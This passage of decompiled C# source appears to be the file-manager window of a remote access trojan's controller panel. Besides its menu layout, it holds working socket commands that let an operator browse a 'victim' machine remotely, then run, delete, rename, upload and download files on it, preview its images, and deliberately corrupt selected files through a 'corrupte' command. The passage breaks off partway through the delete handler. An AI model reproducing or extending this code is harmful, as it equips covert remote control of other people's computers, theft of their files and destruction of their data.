			this.PastToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("PastToolStripMenuItem.Image");
			this.PastToolStripMenuItem.Name = "PastToolStripMenuItem";
			ToolStripItem arg_1893_0 = this.PastToolStripMenuItem;
			size = new Size(196, 22);
			arg_1893_0.Size = size;
			this.PastToolStripMenuItem.Text = "Past";
			this.DownloadToolStripMenuItem.BackColor = Color.Black;
			this.DownloadToolStripMenuItem.ForeColor = Color.White;
			this.DownloadToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("DownloadToolStripMenuItem.Image");
			this.DownloadToolStripMenuItem.Name = "DownloadToolStripMenuItem";
			ToolStripItem arg_1910_0 = this.DownloadToolStripMenuItem;
			size = new Size(196, 22);
			arg_1910_0.Size = size;
			this.DownloadToolStripMenuItem.Text = "Download";
			this.UploadToolStripMenuItem.BackColor = Color.Black;
			this.UploadToolStripMenuItem.ForeColor = Color.White;
			this.UploadToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("UploadToolStripMenuItem.Image");
			this.UploadToolStripMenuItem.Name = "UploadToolStripMenuItem";
			ToolStripItem arg_198D_0 = this.UploadToolStripMenuItem;
			size = new Size(196, 22);
			arg_198D_0.Size = size;
			this.UploadToolStripMenuItem.Text = "Upload";
			this.NewEmptyFileToolStripMenuItem.BackColor = Color.Black;
			this.NewEmptyFileToolStripMenuItem.ForeColor = Color.White;
			this.NewEmptyFileToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("NewEmptyFileToolStripMenuItem.Image");
			this.NewEmptyFileToolStripMenuItem.Name = "NewEmptyFileToolStripMenuItem";
			ToolStripItem arg_1A0A_0 = this.NewEmptyFileToolStripMenuItem;
			size = new Size(196, 22);
			arg_1A0A_0.Size = size;
			this.NewEmptyFileToolStripMenuItem.Text = "New Empty File";
			this.NewFolderToolStripMenuItem.BackColor = Color.Black;
			this.NewFolderToolStripMenuItem.ForeColor = Color.White;
			this.NewFolderToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("NewFolderToolStripMenuItem.Image");
			this.NewFolderToolStripMenuItem.Name = "NewFolderToolStripMenuItem";
			ToolStripItem arg_1A87_0 = this.NewFolderToolStripMenuItem;
			size = new Size(196, 22);
			arg_1A87_0.Size = size;
			this.NewFolderToolStripMenuItem.Text = "New Folder";
			this.OpenFolderToolStripMenuItem.BackColor = Color.Black;
			this.OpenFolderToolStripMenuItem.ForeColor = Color.White;
			this.OpenFolderToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("OpenFolderToolStripMenuItem.Image");
			this.OpenFolderToolStripMenuItem.Name = "OpenFolderToolStripMenuItem";
			ToolStripItem arg_1B04_0 = this.OpenFolderToolStripMenuItem;
			size = new Size(196, 22);
			arg_1B04_0.Size = size;
			this.OpenFolderToolStripMenuItem.Text = "Open Download Folder";
			this.L2.BackColor = Color.Black;
			this.L2.Columns.AddRange(new ColumnHeader[]
			{
				this.ColumnHeader3,
				this.ColumnHeader4,
				this.ColumnHeader5
			});
			this.L2.ContextMenuStrip = this.ContextMenuStrip3;
			this.L2.Dock = DockStyle.Fill;
			this.L2.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.L2.ForeColor = Color.LightSteelBlue;
			this.L2.LargeImageList = this.MG2;
			Control arg_1BDA_0 = this.L2;
			location = new Point(0, 0);
			arg_1BDA_0.Location = location;
			this.L2.Name = "L2";
			Control arg_1C0B_0 = this.L2;
			size = new Size(579, 284);
			arg_1C0B_0.Size = size;
			this.L2.SmallImageList = this.MG2;
			this.L2.TabIndex = 6;
			this.L2.UseCompatibleStateImageBehavior = false;
			this.L2.View = View.Details;
			this.ColumnHeader3.Text = "Name";
			this.ColumnHeader4.Text = "Size";
			this.ColumnHeader5.Text = "Type";
			this.ColumnHeader5.Width = 72;
			this.ContextMenuStrip3.BackColor = Color.Black;
			this.ContextMenuStrip3.Items.AddRange(new ToolStripItem[]
			{
				this.ToolStripMenuItem1,
				this.RefreshToolStripMenuItem2,
				this.ToolStripMenuItem2,
				this.DeleteToolStripMenuItem1,
				this.EditToolStripMenuItem1,
				this.ToolStripMenuItem3,
				this.ToolStripMenuItem4,
				this.ToolStripMenuItem5,
				this.PasteToolStripMenuItem,
				this.ToolStripMenuItem6,
				this.ToolStripMenuItem7,
				this.ToolStripMenuItem8,
				this.ToolStripMenuItem9,
				this.OpenDownloadsToolStripMenuItem,
				this.RarToolStripMenuItem,
				this.UnRarToolStripMenuItem,
				this.UploadFromLinkToolStripMenuItem,
				this.ColerToolStripMenuItem
			});
			this.ContextMenuStrip3.Name = "ContextMenuStrip3";
			this.ContextMenuStrip3.RenderMode = ToolStripRenderMode.System;
			Control arg_1DAB_0 = this.ContextMenuStrip3;
			size = new Size(166, 400);
			arg_1DAB_0.Size = size;
			this.ToolStripMenuItem1.ForeColor = Color.LightSteelBlue;
			this.ToolStripMenuItem1.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem1.Image");
			this.ToolStripMenuItem1.Name = "ToolStripMenuItem1";
			ToolStripItem arg_1E06_0 = this.ToolStripMenuItem1;
			size = new Size(165, 22);
			arg_1E06_0.Size = size;
			this.ToolStripMenuItem1.Text = "UP";
			this.RefreshToolStripMenuItem2.ForeColor = Color.LightSteelBlue;
			this.RefreshToolStripMenuItem2.Image = (Image)componentResourceManager.GetObject("RefreshToolStripMenuItem2.Image");
			this.RefreshToolStripMenuItem2.Name = "RefreshToolStripMenuItem2";
			ToolStripItem arg_1E72_0 = this.RefreshToolStripMenuItem2;
			size = new Size(165, 22);
			arg_1E72_0.Size = size;
			this.RefreshToolStripMenuItem2.Text = "Refresh";
			this.ToolStripMenuItem2.ForeColor = Color.LightSteelBlue;
			this.ToolStripMenuItem2.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem2.Image");
			this.ToolStripMenuItem2.Name = "ToolStripMenuItem2";
			ToolStripItem arg_1EDE_0 = this.ToolStripMenuItem2;
			size = new Size(165, 22);
			arg_1EDE_0.Size = size;
			this.ToolStripMenuItem2.Text = "Run";
			this.DeleteToolStripMenuItem1.ForeColor = Color.LightSteelBlue;
			this.DeleteToolStripMenuItem1.Image = (Image)componentResourceManager.GetObject("DeleteToolStripMenuItem1.Image");
			this.DeleteToolStripMenuItem1.Name = "DeleteToolStripMenuItem1";
			ToolStripItem arg_1F4A_0 = this.DeleteToolStripMenuItem1;
			size = new Size(165, 22);
			arg_1F4A_0.Size = size;
			this.DeleteToolStripMenuItem1.Text = "Delete";
			this.EditToolStripMenuItem1.ForeColor = Color.LightSteelBlue;
			this.EditToolStripMenuItem1.Image = (Image)componentResourceManager.GetObject("EditToolStripMenuItem1.Image");
			this.EditToolStripMenuItem1.Name = "EditToolStripMenuItem1";
			ToolStripItem arg_1FB6_0 = this.EditToolStripMenuItem1;
			size = new Size(165, 22);
			arg_1FB6_0.Size = size;
			this.EditToolStripMenuItem1.Text = "Edit";
			this.ToolStripMenuItem3.ForeColor = Color.LightSteelBlue;
			this.ToolStripMenuItem3.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem3.Image");
			this.ToolStripMenuItem3.Name = "ToolStripMenuItem3";
			ToolStripItem arg_2022_0 = this.ToolStripMenuItem3;
			size = new Size(165, 22);
			arg_2022_0.Size = size;
			this.ToolStripMenuItem3.Text = "Rename";
			this.ToolStripMenuItem4.ForeColor = Color.LightSteelBlue;
			this.ToolStripMenuItem4.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem4.Image");
			this.ToolStripMenuItem4.Name = "ToolStripMenuItem4";
			ToolStripItem arg_208E_0 = this.ToolStripMenuItem4;
			size = new Size(165, 22);
			arg_208E_0.Size = size;
			this.ToolStripMenuItem4.Text = "Copy";
			this.ToolStripMenuItem5.ForeColor = Color.LightSteelBlue;
			this.ToolStripMenuItem5.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem5.Image");
			this.ToolStripMenuItem5.Name = "ToolStripMenuItem5";
			ToolStripItem arg_20FA_0 = this.ToolStripMenuItem5;
			size = new Size(165, 22);
			arg_20FA_0.Size = size;
			this.ToolStripMenuItem5.Text = "Cut";
			this.PasteToolStripMenuItem.ForeColor = Color.LightSteelBlue;
			this.PasteToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("PasteToolStripMenuItem.Image");
			this.PasteToolStripMenuItem.Name = "PasteToolStripMenuItem";
			ToolStripItem arg_2166_0 = this.PasteToolStripMenuItem;
			size = new Size(165, 22);
			arg_2166_0.Size = size;
			this.PasteToolStripMenuItem.Text = "Paste";
			this.ToolStripMenuItem6.ForeColor = Color.LightSteelBlue;
			this.ToolStripMenuItem6.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem6.Image");
			this.ToolStripMenuItem6.Name = "ToolStripMenuItem6";
			ToolStripItem arg_21D2_0 = this.ToolStripMenuItem6;
			size = new Size(165, 22);
			arg_21D2_0.Size = size;
			this.ToolStripMenuItem6.Text = "Download";
			this.ToolStripMenuItem7.ForeColor = Color.LightSteelBlue;
			this.ToolStripMenuItem7.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem7.Image");
			this.ToolStripMenuItem7.Name = "ToolStripMenuItem7";
			ToolStripItem arg_223E_0 = this.ToolStripMenuItem7;
			size = new Size(165, 22);
			arg_223E_0.Size = size;
			this.ToolStripMenuItem7.Text = "Upload";
			this.ToolStripMenuItem8.ForeColor = Color.LightSteelBlue;
			this.ToolStripMenuItem8.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem8.Image");
			this.ToolStripMenuItem8.Name = "ToolStripMenuItem8";
			ToolStripItem arg_22AA_0 = this.ToolStripMenuItem8;
			size = new Size(165, 22);
			arg_22AA_0.Size = size;
			this.ToolStripMenuItem8.Text = "New Empty File";
			this.ToolStripMenuItem9.ForeColor = Color.LightSteelBlue;
			this.ToolStripMenuItem9.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem9.Image");
			this.ToolStripMenuItem9.Name = "ToolStripMenuItem9";
			ToolStripItem arg_2316_0 = this.ToolStripMenuItem9;
			size = new Size(165, 22);
			arg_2316_0.Size = size;
			this.ToolStripMenuItem9.Text = "New Folder";
			this.OpenDownloadsToolStripMenuItem.ForeColor = Color.LightSteelBlue;
			this.OpenDownloadsToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("OpenDownloadsToolStripMenuItem.Image");
			this.OpenDownloadsToolStripMenuItem.Name = "OpenDownloadsToolStripMenuItem";
			ToolStripItem arg_2382_0 = this.OpenDownloadsToolStripMenuItem;
			size = new Size(165, 22);
			arg_2382_0.Size = size;
			this.OpenDownloadsToolStripMenuItem.Text = "Open Downloads";
			this.RarToolStripMenuItem.ForeColor = Color.LightSteelBlue;
			this.RarToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("RarToolStripMenuItem.Image");
			this.RarToolStripMenuItem.Name = "RarToolStripMenuItem";
			ToolStripItem arg_23EE_0 = this.RarToolStripMenuItem;
			size = new Size(165, 22);
			arg_23EE_0.Size = size;
			this.RarToolStripMenuItem.Text = "Victim Color";
			this.UnRarToolStripMenuItem.ForeColor = Color.LightSteelBlue;
			this.UnRarToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("UnRarToolStripMenuItem.Image");
			this.UnRarToolStripMenuItem.Name = "UnRarToolStripMenuItem";
			ToolStripItem arg_245A_0 = this.UnRarToolStripMenuItem;
			size = new Size(165, 22);
			arg_245A_0.Size = size;
			this.UnRarToolStripMenuItem.Text = "Details";
			this.UploadFromLinkToolStripMenuItem.ForeColor = Color.LightSteelBlue;
			this.UploadFromLinkToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("UploadFromLinkToolStripMenuItem.Image");
			this.UploadFromLinkToolStripMenuItem.Name = "UploadFromLinkToolStripMenuItem";
			ToolStripItem arg_24C6_0 = this.UploadFromLinkToolStripMenuItem;
			size = new Size(165, 22);
			arg_24C6_0.Size = size;
			this.UploadFromLinkToolStripMenuItem.Text = "ListView";
			this.ColerToolStripMenuItem.ForeColor = Color.LightSteelBlue;
			this.ColerToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("ColerToolStripMenuItem.Image");
			this.ColerToolStripMenuItem.Name = "ColerToolStripMenuItem";
			ToolStripItem arg_2532_0 = this.ColerToolStripMenuItem;
			size = new Size(165, 22);
			arg_2532_0.Size = size;
			this.ColerToolStripMenuItem.Text = "Color Lines";
			this.ProgressBar1.Dock = DockStyle.Bottom;
			Control arg_2570_0 = this.ProgressBar1;
			location = new Point(155, 324);
			arg_2570_0.Location = location;
			this.ProgressBar1.Name = "ProgressBar1";
			Control arg_259E_0 = this.ProgressBar1;
			size = new Size(579, 10);
			arg_259E_0.Size = size;
			this.ProgressBar1.TabIndex = 107;
			this.TextBox1.BackColor = Color.Black;
			this.TextBox1.BorderStyle = BorderStyle.FixedSingle;
			this.TextBox1.Dock = DockStyle.Top;
			this.TextBox1.ForeColor = Color.LightSteelBlue;
			Control arg_2604_0 = this.TextBox1;
			location = new Point(155, 0);
			arg_2604_0.Location = location;
			this.TextBox1.Multiline = true;
			this.TextBox1.Name = "TextBox1";
			Control arg_263F_0 = this.TextBox1;
			size = new Size(579, 40);
			arg_263F_0.Size = size;
			this.TextBox1.TabIndex = 115;
			this.Panel1.Controls.Add(this.L2);
			this.Panel1.Dock = DockStyle.Fill;
			Control arg_268E_0 = this.Panel1;
			location = new Point(155, 40);
			arg_268E_0.Location = location;
			this.Panel1.Name = "Panel1";
			Control arg_26BF_0 = this.Panel1;
			size = new Size(579, 284);
			arg_26BF_0.Size = size;
			this.Panel1.TabIndex = 116;
			this.Button3.BackColor = Color.Black;
			this.Button3.Cursor = Cursors.Hand;
			this.Button3.FlatStyle = FlatStyle.Flat;
			this.Button3.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Button3.ForeColor = Color.LightSteelBlue;
			Control arg_2744_0 = this.Button3;
			location = new Point(64, 8);
			arg_2744_0.Location = location;
			this.Button3.Name = "Button3";
			Control arg_276F_0 = this.Button3;
			size = new Size(98, 26);
			arg_276F_0.Size = size;
			this.Button3.TabIndex = 117;
			this.Button3.Text = "Refresh";
			this.Button3.UseVisualStyleBackColor = false;
			this.Button5.BackColor = Color.Black;
			this.Button5.Cursor = Cursors.Hand;
			this.Button5.FlatStyle = FlatStyle.Flat;
			this.Button5.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Button5.ForeColor = Color.LightSteelBlue;
			Control arg_2815_0 = this.Button5;
			location = new Point(347, 8);
			arg_2815_0.Location = location;
			this.Button5.Name = "Button5";
			Control arg_2840_0 = this.Button5;
			size = new Size(82, 26);
			arg_2840_0.Size = size;
			this.Button5.TabIndex = 118;
			this.Button5.Text = "Resume";
			this.Button5.UseVisualStyleBackColor = false;
			this.Button1.BackColor = Color.Black;
			this.Button1.Cursor = Cursors.Hand;
			this.Button1.FlatStyle = FlatStyle.Flat;
			this.Button1.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Button1.ForeColor = Color.LightSteelBlue;
			Control arg_28E6_0 = this.Button1;
			location = new Point(253, 8);
			arg_28E6_0.Location = location;
			this.Button1.Name = "Button1";
			Control arg_2911_0 = this.Button1;
			size = new Size(98, 26);
			arg_2911_0.Size = size;
			this.Button1.TabIndex = 119;
			this.Button1.Text = "Edit";
			this.Button1.UseVisualStyleBackColor = false;
			this.Button2.BackColor = Color.Black;
			this.Button2.Cursor = Cursors.Hand;
			this.Button2.FlatStyle = FlatStyle.Flat;
			this.Button2.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Button2.ForeColor = Color.LightSteelBlue;
			Control arg_29B7_0 = this.Button2;
			location = new Point(160, 8);
			arg_29B7_0.Location = location;
			this.Button2.Name = "Button2";
			Control arg_29E2_0 = this.Button2;
			size = new Size(98, 26);
			arg_29E2_0.Size = size;
			this.Button2.TabIndex = 120;
			this.Button2.Text = "Upload";
			this.Button2.UseVisualStyleBackColor = false;
			this.Button4.BackColor = Color.Black;
			this.Button4.Cursor = Cursors.Hand;
			this.Button4.FlatStyle = FlatStyle.Flat;
			this.Button4.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Button4.ForeColor = Color.LightSteelBlue;
			Control arg_2A88_0 = this.Button4;
			location = new Point(422, 8);
			arg_2A88_0.Location = location;
			this.Button4.Name = "Button4";
			Control arg_2AB3_0 = this.Button4;
			size = new Size(98, 26);
			arg_2AB3_0.Size = size;
			this.Button4.TabIndex = 121;
			this.Button4.Text = "Delete";
			this.Button4.UseVisualStyleBackColor = false;
			this.Panel2.Controls.Add(this.Button3);
			this.Panel2.Controls.Add(this.Button4);
			this.Panel2.Controls.Add(this.Button2);
			this.Panel2.Controls.Add(this.Button5);
			this.Panel2.Controls.Add(this.Button1);
			Control arg_2B6E_0 = this.Panel2;
			location = new Point(155, 0);
			arg_2B6E_0.Location = location;
			this.Panel2.Name = "Panel2";
			Control arg_2B9C_0 = this.Panel2;
			size = new Size(2160, 40);
			arg_2B9C_0.Size = size;
			this.Panel2.TabIndex = 117;
			SizeF autoScaleDimensions = new SizeF(6f, 13f);
			this.AutoScaleDimensions = autoScaleDimensions;
			this.AutoScaleMode = AutoScaleMode.Font;
			this.BackColor = SystemColors.ActiveCaptionText;
			size = new Size(734, 356);
			this.ClientSize = size;
			this.Controls.Add(this.Panel2);
			this.Controls.Add(this.Panel1);
			this.Controls.Add(this.TextBox1);
			this.Controls.Add(this.ProgressBar1);
			this.Controls.Add(this.L1);
			this.Controls.Add(this.StatusStrip1);
			this.Icon = (Icon)componentResourceManager.GetObject("$this.Icon");
			this.Name = "Frm_FileManager";
			this.StartPosition = FormStartPosition.CenterScreen;
			this.Text = "File Manger";
			this.StatusStrip1.ResumeLayout(false);
			this.StatusStrip1.PerformLayout();
			this.ContextMenuStrip4.ResumeLayout(false);
			this.ContextMenuStrip1.ResumeLayout(false);
			this.ContextMenuStrip2.ResumeLayout(false);
			this.ContextMenuStrip3.ResumeLayout(false);
			this.Panel1.ResumeLayout(false);
			this.Panel2.ResumeLayout(false);
			this.ResumeLayout(false);
			this.PerformLayout();
		}

		public Frm_FileManager()
		{
			base.FormClosing += new FormClosingEventHandler(this.FM_FormClosing);
			base.Load += new EventHandler(this.FM_Load);
			base.Resize += new EventHandler(this.FM_Resize);
			Frm_FileManager.__ENCAddToList(this);
			base.FormClosing += new FormClosingEventHandler(this.FM_FormClosing);
			base.Load += new EventHandler(this.FM_Load);
			base.Resize += new EventHandler(this.FM_Resize);
			this.Images = new Collection();
			this.QQ = "";
			this.Cache = new Collection();
			PictureBox pictureBox = new PictureBox();
			Size size = new Size(200, 190);
			pictureBox.Size = size;
			pictureBox.BackColor = Color.Black;
			pictureBox.SizeMode = PictureBoxSizeMode.Zoom;
			this.P = pictureBox;
			this.folder = "";
			this.isCut = false;
			this.Flist = "";
			this.InitializeComponent();
		}

		private void EditToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.L2.SelectedItems.Count > 0;
			if (flag)
			{
				IEnumerator enumerator = null;
				string text = "rd";
				try
				{
					enumerator = this.L2.SelectedItems.GetEnumerator();
					while (enumerator.MoveNext())
					{
						ListViewItem listViewItem = (ListViewItem)enumerator.Current;
						flag = (Operators.CompareString(listViewItem.SubItems[2].Text, "DIR", false) != 0);
						if (flag)
						{
							ListViewItem listViewItem2 = listViewItem;
							string toolTipText = listViewItem2.ToolTipText;
							listViewItem2.ToolTipText = toolTipText;
							text = text + sokserver.Y + FN.ENB(ref toolTipText);
						}
					}
				}
				finally
				{
					flag = (enumerator is IDisposable);
					if (flag)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
				this.sk.Send(text);
			}
		}

		public void exp(string x, bool Refresh = false)
		{
			ToolStripProgressBar toolStripProgressBar = new ToolStripProgressBar();
			ToolStripProgressBar obj = toolStripProgressBar;
			checked
			{
				lock (obj)
				{
					this.P.Image = null;
					this.P.Visible = false;
					this.TextBox1.BackColor = Color.Coral;
					string text = x.Replace("\\\\", "\\");
					bool flag = !text.EndsWith("\\");
					if (flag)
					{
						text += "\\";
					}
					this.TextBox1.Text = text;
					flag = (Refresh && this.Cache.Contains(text));
					if (flag)
					{
						this.Cache.Remove(text);
					}
					flag = this.Cache.Contains(text);
					if (flag)
					{
						this.TextBox1.BackColor = Color.Purple;
						FMcach fMcach = (FMcach)this.Cache[text];
						toolStripProgressBar.Value = 0;
						toolStripProgressBar.Maximum = fMcach.files.Count + fMcach.folders.Count;
						this.L2.Items.Clear();
						flag = (new DirectoryInfo(text).Parent != null);
						if (flag)
						{
							ListViewItem listViewItem = this.L2.Items.Add("..", "..", 0);
							listViewItem.SubItems.Add("");
							listViewItem.SubItems.Add("DIR");
							listViewItem.ToolTipText = new DirectoryInfo(text).Parent.FullName + "\\";
						}
						try
						{
							List<string>.Enumerator enumerator = fMcach.folders.GetEnumerator();
							while (enumerator.MoveNext())
							{
								string current = enumerator.Current;
								ToolStripProgressBar toolStripProgressBar2 = toolStripProgressBar;
								ToolStripProgressBar toolStripProgressBar3 = toolStripProgressBar2;
								toolStripProgressBar3.Value++;
								ListViewItem listViewItem2 = this.L2.Items.Add(current, new DirectoryInfo(current).Name, 0);
								listViewItem2.SubItems.Add("");
								listViewItem2.SubItems.Add("DIR");
								listViewItem2.ToolTipText = current;
							}
						}
						finally
						{
							List<string>.Enumerator enumerator;
							((IDisposable)enumerator).Dispose();
						}
						try
						{
							List<string>.Enumerator enumerator2 = fMcach.files.GetEnumerator();
							while (enumerator2.MoveNext())
							{
								string current2 = enumerator2.Current;
								ToolStripProgressBar toolStripProgressBar2 = toolStripProgressBar;
								ToolStripProgressBar toolStripProgressBar3 = toolStripProgressBar2;
								toolStripProgressBar3.Value++;
								string[] array = Strings.Split(current2, ";", -1, CompareMethod.Binary);
								FileInfo fileInfo = new FileInfo(array[0]);
								ListViewItem listViewItem3 = this.L2.Items.Add(fileInfo.FullName, fileInfo.Name, 1);
								listViewItem3.ToolTipText = fileInfo.FullName;
								listViewItem3.SubItems.Add(array[1]);
								listViewItem3.SubItems.Add(array[2]);
								flag = (fileInfo.Extension.Length > 0);
								if (flag)
								{
									bool flag2 = !this.MG2.Images.ContainsKey(fileInfo.Extension);
									if (flag2)
									{
										File.Create(Application.StartupPath + "\\!" + fileInfo.Extension).Close();
										this.MG2.Images.Add(fileInfo.Extension, Icon.ExtractAssociatedIcon(Application.StartupPath + "\\!" + fileInfo.Extension));
										File.Delete(Application.StartupPath + "\\!" + fileInfo.Extension);
										listViewItem3.ImageKey = fileInfo.Extension;
									}
									else
									{
										listViewItem3.ImageKey = fileInfo.Extension;
									}
								}
							}
						}
						finally
						{
							List<string>.Enumerator enumerator2;
							((IDisposable)enumerator2).Dispose();
						}
						this.L2.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
						toolStripProgressBar.Value = 0;
					}
					else
					{
						this.sk.Send("!" + sokserver.Y + FN.ENB(ref text));
					}
				}
			}
		}

		private void FM_FormClosing(object sender, FormClosingEventArgs e)
		{
			try
			{
				this.P.Dispose();
			}
			catch (Exception expr_10)
			{
				ProjectData.SetProjectError(expr_10);
				Exception projectError = expr_10;
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
			try
			{
				this.Images.Clear();
			}
			catch (Exception expr_3E)
			{
				ProjectData.SetProjectError(expr_3E);
				Exception projectError2 = expr_3E;
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
			try
			{
				this.Cache.Clear();
			}
			catch (Exception expr_6C)
			{
				ProjectData.SetProjectError(expr_6C);
				Exception projectError3 = expr_6C;
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
			this.sk.CN = false;
		}

		private void FM_Load(object sender, EventArgs e)
		{
			this.Timer2.Start();
			this.L2.Controls.Add(this.P);
			this.P.BringToFront();
			this.sk.Folder = this.osk.Folder;
			this.P.Visible = false;
			this.P.BorderStyle = BorderStyle.FixedSingle;
			this.QQ = Conversions.ToString(RuntimeHelpers.GetObjectValue(sokserver.vno(this.osk.L)));
			this.Text = this.QQ;
			try
			{
				this.folder = this.osk.Folder + "Downloads\\";
			}
			catch (Exception expr_AB)
			{
				ProjectData.SetProjectError(expr_AB);
				Exception projectError = expr_AB;
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
			this.sk.Send("~");
		}

		private void FM_Resize(object sender, EventArgs e)
		{
			checked
			{
				this.P.Left = this.L2.Width - this.P.Width - 25;
				this.P.Top = this.L2.Height - this.P.Height - 25;
			}
		}

		private void L1_DoubleClick(object sender, EventArgs e)
		{
			bool flag = this.L1.SelectedItems.Count != 0;
			if (flag)
			{
				this.exp(this.L1.SelectedItems[0].ToolTipText, false);
			}
		}

		private void L2_DoubleClick(object sender, EventArgs e)
		{
			bool flag = this.L2.SelectedItems.Count != 0;
			if (flag)
			{
				bool flag2 = Operators.CompareString(this.L2.SelectedItems[0].SubItems[2].Text, "DIR", false) == 0;
				if (flag2)
				{
					this.exp(this.L2.SelectedItems[0].ToolTipText, false);
				}
				else
				{
					ListViewItem listViewItem = this.L2.SelectedItems[0];
					string toolTipText = listViewItem.ToolTipText;
					listViewItem.ToolTipText = toolTipText;
					this.sk.Send("rd" + sokserver.Y + FN.ENB(ref toolTipText));
				}
			}
		}

		private void L2_SelectedIndexChanged(object sender, EventArgs e)
		{
			this.P.Image = null;
			this.P.Visible = false;
			bool flag = this.L2.SelectedItems.Count == 1;
			if (flag)
			{
				ListViewItem listViewItem = this.L2.SelectedItems[0];
				flag = this.Images.Contains(listViewItem.ToolTipText);
				if (flag)
				{
					this.P.Image = (Image)this.Images[listViewItem.ToolTipText];
					this.P.Visible = true;
				}
				else
				{
					flag = ".jpg.jpeg.png.ico.bmp.tiff.gif".Contains(listViewItem.SubItems[2].Text.ToLower());
					if (flag)
					{
						ListViewItem listViewItem2 = listViewItem;
						string toolTipText = listViewItem2.ToolTipText;
						listViewItem2.ToolTipText = toolTipText;
						this.sk.Send("#" + sokserver.Y + FN.ENB(ref toolTipText));
					}
				}
			}
		}

		private void Timer1_Tick(object sender, EventArgs e)
		{
			bool flag = this.osk == null | this.sk == null;
			if (flag)
			{
				this.Close();
			}
			flag = (!this.osk.CN | !this.sk.CN);
			if (flag)
			{
				this.Close();
			}
		}

		private void UPToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.L2.Items.ContainsKey("..");
			if (flag)
			{
				this.exp(this.L2.Items[".."].ToolTipText, false);
			}
		}

		private void CorrupteToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.L2.SelectedItems.Count > 0;
			if (flag)
			{
				IEnumerator enumerator = null;
				string text = "corrupte";
				try
				{
					enumerator = this.L2.SelectedItems.GetEnumerator();
					while (enumerator.MoveNext())
					{
						ListViewItem listViewItem = (ListViewItem)enumerator.Current;
						flag = (Operators.CompareString(listViewItem.SubItems[2].Text, "DIR", false) != 0);
						if (flag)
						{
							ListViewItem listViewItem2 = listViewItem;
							string toolTipText = listViewItem2.ToolTipText;
							listViewItem2.ToolTipText = toolTipText;
							text = text + sokserver.Y + FN.ENB(ref toolTipText);
						}
					}
				}
				finally
				{
					flag = (enumerator is IDisposable);
					if (flag)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
				this.sk.Send(text);
			}
		}

		private void ToolStripMenuItem10_Click(object sender, EventArgs e)
		{
			this.sk.Send("~");
		}

		private void Timer2_Tick(object sender, EventArgs e)
		{
			bool flag = this.ProgressBar1.Value == 100;
			if (flag)
			{
				this.ProgressBar1.Value = 0;
			}
			else
			{
				this.ProgressBar1.Value = checked((int)Math.Round(unchecked(Conversion.Val(this.ProgressBar1.Value) + Conversion.Val(10))));
			}
		}

		private void ToolStripMenuItem1_Click_1(object sender, EventArgs e)
		{
			bool flag = this.L2.Items.ContainsKey("..");
			if (flag)
			{
				this.exp(this.L2.Items[".."].ToolTipText, false);
			}
		}

		private void ContextMenuStrip1_Opening(object sender, CancelEventArgs e)
		{
		}

		private void RefreshToolStripMenuItem2_Click(object sender, EventArgs e)
		{
			bool flag = this.TextBox1.Text.Length > 0;
			if (flag)
			{
				this.exp(this.TextBox1.Text, true);
			}
		}

		private void ToolStripMenuItem2_Click(object sender, EventArgs e)
		{
			bool flag = this.L2.SelectedItems.Count > 0;
			if (flag)
			{
				IEnumerator enumerator = null;
				string text = "rn";
				try
				{
					enumerator = this.L2.SelectedItems.GetEnumerator();
					while (enumerator.MoveNext())
					{
						ListViewItem listViewItem = (ListViewItem)enumerator.Current;
						string toolTipText = listViewItem.ToolTipText;
						listViewItem.ToolTipText = toolTipText;
						text = text + sokserver.Y + FN.ENB(ref toolTipText);
					}
				}
				finally
				{
					flag = (enumerator is IDisposable);
					if (flag)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
				this.sk.Send(text);
			}
		}

		private void DeleteToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			bool flag = this.L2.SelectedItems.Count > 0;
			if (flag)
			{
				IEnumerator enumerator = null;
				string text = "dl";
				try
				{
					enumerator = this.L2.SelectedItems.GetEnumerator();
					while (enumerator.MoveNext())
					{
						ListViewItem listViewItem = (ListViewItem)enumerator.Current;
						flag = (Operators.CompareString(listViewItem.Text, "..", false) != 0);
						if (flag)
						{
							bool flag2 = Operators.CompareString(listViewItem.SubItems[2].Text, "DIR", false) == 0;
							if (flag2)
							{
								string arg_A8_0 = text;
								string arg_A8_1 = sokserver.Y;
